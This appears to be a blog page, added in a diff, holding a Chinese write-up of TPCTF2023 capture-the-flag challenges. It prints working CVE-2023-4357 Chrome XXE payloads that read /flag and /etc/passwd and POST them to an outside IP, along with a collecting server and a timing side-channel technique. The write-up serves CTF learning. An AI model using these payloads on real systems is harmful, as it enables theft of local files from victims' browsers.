@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            TPCTF2023
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="xss-bot"><a href="#xss-bot" class="headerlink" title="xss_bot"></a>xss_bot</h1><h2 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h2><p>参考这里：<a target="_blank" rel="noopener" href="https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE">https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE</a></p>
+<p>第一天晚上测试了贼久，post返回的数据为空，第二天早上再测，逐步排查问题，在环境里加代码，selenium访问完页面截一张图出来，哈，看到flag了，说明方法是对的，只是数据带回来时候出错了。索性直接把flag用get参数带回来，出了。</p>
+<p>a.svg</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;?#&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE div [ </span><br><span class="line">  &lt;!ENTITY passwd_p        &quot;file:///flag&quot;&gt;</span><br><span class="line">  &lt;!ENTITY passwd_c SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;</span><br><span class="line">  &lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="line">    &lt;xsl:copy-of select=&quot;document(&#x27;&#x27;)&quot;/&gt;</span><br><span class="line">    &lt;body xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">      &lt;div style=&quot;display:none&quot;&gt;</span><br><span class="line">        &lt;p class=&quot;&amp;passwd_p;&quot;&gt;&amp;passwd_c;&lt;/p&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div style=&quot;width:40rem&quot; id=&quot;r&quot; /&gt;</span><br><span class="line"></span><br><span class="line">      &lt;script&gt;</span><br><span class="line">        document.querySelector(&#x27;#r&#x27;).innerHTML = `</span><br><span class="line">remote web url:    &amp;lt;textarea style=&quot;width:100%;height:1rem&quot;&gt;$&#123;location.href&#125;&amp;lt;/textarea&gt;&amp;lt;br/&gt;&amp;lt;br/&gt;`;</span><br><span class="line">        document.querySelectorAll(&#x27;p&#x27;).forEach(p =&gt; &#123;</span><br><span class="line">          //You can send p.innerHTML by POST.</span><br><span class="line">          document.querySelector(&#x27;#r&#x27;).innerHTML += `</span><br><span class="line">local file path:   &amp;lt;textarea style=&quot;width:100%;height:1rem&quot;&gt;$&#123; p.className &#125;&amp;lt;/textarea&gt;&amp;lt;br/&gt;</span><br><span class="line">local file content:&amp;lt;textarea style=&quot;width:100%;height:6rem&quot;&gt;$&#123; p.innerHTML &#125;&amp;lt;/textarea&gt;&amp;lt;br/&gt;&amp;lt;br/&gt;`;</span><br><span class="line"></span><br><span class="line">        fetch(&#x27;http://120.76.118.202:13000/data?&#x27;+&#x27;1111111111&#x27;, &#123;</span><br><span class="line">            method:&quot;POST&quot;,</span><br><span class="line">            headers:&#123;&quot;Content-Type&quot;:&quot;application/json&quot;&#125;,</span><br><span class="line">            body:JSON.stringify(&#123;p:p.innerHTML&#125;)</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">  &lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure>
+
+<p>server.js</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">const port = 13000;</span><br><span class="line">app.use(express.json())</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;))</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/data&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;data!!!&#x27;,req.method)</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Method&#x27;, &#x27;POST&#x27;);</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;content-type&#x27;);</span><br><span class="line">    // console.log(req.headers)</span><br><span class="line">    console.log(req.body)</span><br><span class="line">    console.log(req.query)</span><br><span class="line">    // console.log(req)</span><br><span class="line">    res.send(&#x27;ok&#x27;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">  console.log(`Example app listening on port $&#123;port&#125;`);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="一开始不通的解法"><a href="#一开始不通的解法" class="headerlink" title="一开始不通的解法"></a>一开始不通的解法</h2><p>一开始参考这个：<a target="_blank" rel="noopener" href="https://cn-sec.com/archives/2224247.html">https://cn-sec.com/archives/2224247.html</a></p>
+<p>解题大致思路：发送b.html给bot，bot访问b.html，加载iframe，iframe再加载test.svg和解析test.xsl。要做的只是把iframe里的内容带出来。</p>
+<p>本地起题目环境测试，发现vps上的test.svg和test.xsl都能被访问，但是没有发送带回数据的请求。</p>
+<p>自己再测试，b.html，svg，xsl都放到同一个vps上，可以发带回数据的请求。</p>
+<p>再测试，b.html放到8.222.191.116，svg和xsl放到别的地方，访问b.html，浏览器报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Uncaught DOMException: Blocked a frame with origin &quot;http://8.222.191.116:13000&quot; from accessing a cross-origin frame.</span><br></pre></td></tr></table></figure>
+
+<p>提示问题出在这里：<code>const ifrDoc = ifr.contentWindow.document.documentElement;</code></p>
+<p>此时查看到svg和xsl都被访问到了。</p>
+<p>下面是代码</p>
+<p>test.svg</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;#&quot;?&gt;</span><br><span class="line">&lt;xsl:stylesheet id=&quot;color-change&quot; version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;</span><br><span class="line">&lt;xsl:template match=&quot;/&quot;&gt;</span><br><span class="line">	&lt;svg version=&quot;1.1&quot; id=&quot;Capa_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; viewBox=&quot;0 0 1000 1000&quot;&gt;</span><br><span class="line">		&lt;foreignObject id=&quot;myObj&quot; width=&quot;1000&quot; height=&quot;1000&quot;&gt;</span><br><span class="line">		    &lt;div style=&quot;font-size:xxx-large&quot; xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">			&lt;a href=&quot;#&quot;&gt;#Copy me#&lt;/a&gt;&lt;br/&gt;</span><br><span class="line">			XSL: &lt;xsl:value-of select=&quot;system-property(&#x27;xsl:version&#x27;)&quot;/&gt;&lt;br/&gt;</span><br><span class="line">			Vendor: &lt;xsl:value-of select=&quot;system-property(&#x27;xsl:vendor&#x27;)&quot;/&gt;&lt;br/&gt;</span><br><span class="line">			Vendor URL: &lt;xsl:value-of select=&quot;system-property(&#x27;xsl:vendor-url&#x27;)&quot;/&gt;&lt;br/&gt;</span><br><span class="line">			document() &lt;xsl:copy-of  select=&quot;document(&#x27;test.xsl&#x27;)&quot;/&gt;</span><br><span class="line">		    &lt;/div&gt;</span><br><span class="line">		&lt;/foreignObject&gt;</span><br><span class="line">	&lt;/svg&gt;</span><br><span class="line"> &lt;/xsl:template&gt;</span><br><span class="line">&lt;/xsl:stylesheet&gt;</span><br></pre></td></tr></table></figure>
+
+<p>test.xsl</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE p [</span><br><span class="line">&lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY hosts SYSTEM &quot;file:///etc/hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY flag SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY group SYSTEM &quot;file://localhost/etc/group&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;</span><br><span class="line">  &lt;p style=&quot;border-style: dotted;&quot;&gt;/etc/passwd: </span><br><span class="line">&amp;passwd;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line"> &lt;p style=&quot;border-style: dotted;&quot;&gt;/etc/hosts:</span><br><span class="line">&amp;hosts;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line"> &lt;p style=&quot;border-style: dotted;&quot;&gt;/etc/group:</span><br><span class="line">&amp;group;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">   &lt;p style=&quot;border-style: dotted;&quot;&gt;/flag:</span><br><span class="line"> &amp;flag;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>server.js</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">const port = 13000;</span><br><span class="line">app.use(express.json())</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;))</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/test.svg&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;/test.svg&#x27;)</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    // res.set(&#x27;X-Frame-Options&#x27;,&#x27;SAMEORIGIN&#x27;)</span><br><span class="line">    res.sendFile(path.join(__dirname, &#x27;test.svg&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/data&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;data!!!&#x27;,req.method)</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Method&#x27;, &#x27;POST&#x27;);</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Headers&#x27;, &#x27;Content-Type&#x27;);</span><br><span class="line">    console.log(req.body)</span><br><span class="line">    console.log(req.query)</span><br><span class="line">    // console.log(req)</span><br><span class="line">    res.send(&#x27;ok&#x27;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.all(&#x27;/b.html&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;/b.html&#x27;)</span><br><span class="line">    // res.set(&#x27;X-Frame-Options&#x27;,&#x27;SAMEORIGIN&#x27;)</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.sendFile(path.join(__dirname, &#x27;b.html&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/b.svg&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;/b.svg&#x27;)</span><br><span class="line">    // res.set(&#x27;X-Frame-Options&#x27;,&#x27;SAMEORIGIN&#x27;)</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.sendFile(path.join(__dirname, &#x27;b.svg&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.all(&#x27;/test.xsl&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;/test.xsl&#x27;)</span><br><span class="line">    res.set(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.sendFile(path.join(__dirname, &#x27;test.xsl&#x27;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">  console.log(`Example app listening on port $&#123;port&#125;`);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>b.html</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        const r = document.createElement(&#x27;div&#x27;);</span><br><span class="line">        r.style.width = &#x27;40rem&#x27;;document.body.appendChild(r);</span><br><span class="line">        const ifr = document.createElement(&#x27;iframe&#x27;);</span><br><span class="line">        ifr.style.display = &#x27;none&#x27;;</span><br><span class="line">        document.body.appendChild(ifr);</span><br><span class="line">        ifr.onload = function() &#123;</span><br><span class="line">            const ifrDoc = ifr.contentWindow.document.documentElement;</span><br><span class="line">            r.innerHTML = `remote web url:&lt;input value=&quot;$&#123;location.href&#125;&quot; style=&quot;width:100%&quot; /&gt;&lt;br/&gt;&lt;br/&gt;`;</span><br><span class="line">            ifrDoc.querySelectorAll(&#x27;p&#x27;).forEach(p =&gt; </span><br><span class="line">            &#123;</span><br><span class="line">                r.innerHTML += `local file path:&lt;input value=&quot;$&#123;p.getAttribute(&quot;path&quot;)&#125;&quot; style=&quot;width:100%&quot; /&gt;&lt;br/&gt;local file content:&lt;textarea style=&quot;width:100%;height:6rem&quot;&gt;$&#123;p.innerHTML&#125;&lt;/textarea&gt;&lt;br/&gt;&lt;br/&gt;`;</span><br><span class="line">                fetch(&#x27;http://120.76.118.202:13000/data&#x27;, &#123;</span><br><span class="line">                     method:&quot;POST&quot;,</span><br><span class="line">                     body:JSON.stringify(&#123;p:p.innerHTML&#125;)</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        ifr.src = &quot;http://120.76.118.202:13000/test.svg&quot;;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="xss-bot-no-internet"><a href="#xss-bot-no-internet" class="headerlink" title="xss_bot no internet"></a>xss_bot no internet</h1><p>没别的地方可看了，只能看看这部分有没有地方可以触发报错或者延时</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    options = webdriver.ChromeOptions()</span><br><span class="line">    options.add_argument(&quot;--no-sandbox&quot;)  # sandbox not working in docker</span><br><span class="line">    options.add_argument(&quot;--headless&quot;)</span><br><span class="line">    options.add_argument(&quot;--disable-gpu&quot;)</span><br><span class="line">    options.add_argument(&quot;--user-data-dir=/dev/shm/user-data/&quot;+user_id)</span><br><span class="line">    os.environ[&quot;TMPDIR&quot;] = &quot;/dev/shm/chromium-data/&quot;</span><br><span class="line">    options.add_experimental_option(&quot;excludeSwitches&quot;, [&quot;enable-logging&quot;])</span><br><span class="line"></span><br><span class="line">    with webdriver.Chrome(options=options) as driver:</span><br><span class="line">        ua = driver.execute_script(&quot;return navigator.userAgent&quot;)</span><br><span class="line">        print(&quot; I am using&quot;, ua)</span><br><span class="line">        driver.set_page_load_timeout(15)</span><br><span class="line">        print(&quot;- Now browsing your website...&quot;)</span><br><span class="line">        driver.get(&quot;http://localhost:&quot;+port_id+&quot;/&quot;+file_name)</span><br><span class="line">        time.sleep(4)</span><br><span class="line">        print(&quot;Bye bye!&quot;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(&quot;ERROR&quot;, type(e))</span><br><span class="line">    print(&quot;I&#x27;ll not give you exception message this time.&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>看了一会，只能想办法让<code>set_page_load_timeout</code>报异常了。</p>
+<p>去搜如何延缓页面加载时间，普通的setTimeout是不行的。</p>
+<p>…….</p>
+<p><code>&lt;script src=&quot;http://1.1.1.1/1.js&quot;&gt;&lt;/script&gt;</code>，本地测试，这玩意写进去能够延缓访问时间，但只能延缓近0.1秒，根本不够。但是也没管那么多，写进题目里看看，报异常了……估计是我环境通网找不到1.1.1.1就直接取消了，而题目由于不通网就一直卡住。还是得是实际测试。</p>
+<p>接下来就是判断字符，然后动态写入这个标签。</p>
+<p>测试发现，只要代码里含有<code>&lt;script src=&quot;http://1.1.1.1/1.js&quot;&gt;&lt;/script&gt;</code>就会超时，无论是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(false)&#123;</span><br><span class="line">	document.write(`&lt;script src=&quot;http://1.1.1.1/1.js&quot;&gt;&lt;/script&gt;`)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//&lt;script src=&quot;http://1.1.1.1/1.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>换了个写法，但是不超时了，也不行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.write(String.fromCharCode(...))</span><br></pre></td></tr></table></figure>
+
+<p>又卡住了。</p>
+<p>……</p>
+<p>那既然写了script标签怎样都会超时，那看看能不能手动停止加载页面。又搜索了一番，<code>window.stop()</code>可以。测试，成了。</p>
+<p>所以只要判断字符对了就执行<code>window.stop()</code></p>
+<p>剩下的就是爆破了，手动爆破，先爆长度再爆范围。</p>
+<p>爆破时候发现小于号&lt;不生效，我猜测是给当做标签开头来处理了，这毕竟不是正规的js文件，出问题也正常。</p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#xss-bot"><span class="toc-text">xss_bot</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E8%A7%A3"><span class="toc-text">正解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%BC%80%E5%A7%8B%E4%B8%8D%E9%80%9A%E7%9A%84%E8%A7%A3%E6%B3%95"><span class="toc-text">一开始不通的解法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xss-bot-no-internet"><span class="toc-text">xss_bot no internet</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
